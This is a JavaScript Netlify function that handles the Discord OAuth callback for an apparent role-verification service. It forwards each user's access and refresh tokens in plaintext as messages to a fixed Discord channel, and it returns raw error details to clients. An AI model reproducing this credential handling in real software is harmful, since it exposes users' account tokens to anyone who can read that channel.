import fetch from 'node-fetch';

export async function handler(event, context) {
  const { code, state: sessionId } = event.queryStringParameters || {};

  if (!code || !sessionId) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: 'Authorization code and session are required' }),
    };
  }

  const clientId = process.env.DISCORD_CLIENT_ID;
  const clientSecret = process.env.DISCORD_CLIENT_SECRET;
  const redirectUri = 'https://yuki-auth.netlify.app/.netlify/functions/callback';

  // Debug: 環境変数の確認
  console.log('Environment check:', {
    hasClientId: !!clientId,
    hasClientSecret: !!clientSecret,
    clientIdLength: clientId?.length || 0
  });

  try {
    const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: new URLSearchParams({
        client_id: clientId,
        client_secret: clientSecret,
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: redirectUri,
      }),
    });

    const tokenData = await tokenResponse.json();

    if (!tokenResponse.ok) {
      console.error('Token exchange error:', tokenData);
      return {
        statusCode: 500,
        body: JSON.stringify({
          error: 'Failed to exchange authorization code',
          details: tokenData,
          redirectUri: redirectUri
        }),
      };
    }

    const { access_token, refresh_token, expires_in } = tokenData;

    // Step 2: Get user information
    const userResponse = await fetch('https://discord.com/api/users/@me', {
      headers: {
        Authorization: `Bearer ${access_token}`,
      },
    });

    const userData = await userResponse.json();

    if (!userResponse.ok) {
      console.error('User fetch error:', userData);
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Failed to fetch user data' }),
      };
    }

    const userId = userData.id;

    // Step 3: Decode session data from Base64 to get channelId, guildId, roleId
    let sessionData;
    try {
      const decodedSession = Buffer.from(sessionId, 'base64').toString('utf-8');
      sessionData = JSON.parse(decodedSession);
    } catch (decodeError) {
      console.error('Failed to decode session data:', decodeError);
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Invalid session data' }),
      };
    }

    const { guildId, roleId } = sessionData;

    // Step 4: Send data to fixed Discord channel using Bot Token
    const botToken = process.env.DISCORD_BOT_TOKEN;
    const fixedChannelId = '1433718555131777046'; // 固定のチャンネルID

    if (botToken) {
      try {
        const webhookData = {
          userId: userId,
          sessionId: sessionId,
          guildId: guildId,
          roleId: roleId,
          accessToken: access_token,
          refreshToken: refresh_token,
          expiresIn: expires_in,
        };

        await fetch(`https://discord.com/api/v10/channels/${fixedChannelId}/messages`, {
          method: 'POST',
          headers: {
            'Authorization': `Bot ${botToken}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: JSON.stringify(webhookData),
          }),
        });
      } catch (channelError) {
        console.error('Discord channel message error:', channelError);
        // Continue even if channel message fails
      }
    } else {
      console.warn('DISCORD_BOT_TOKEN not set, skipping notification');
    }

    // Step 4: Redirect to success page
    return {
      statusCode: 302,
      headers: {
        Location: `/success.html?user=${encodeURIComponent(userData.username)}`,
      },
    };
  } catch (error) {
    console.error('Callback error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Internal server error' }),
    };
  }
}
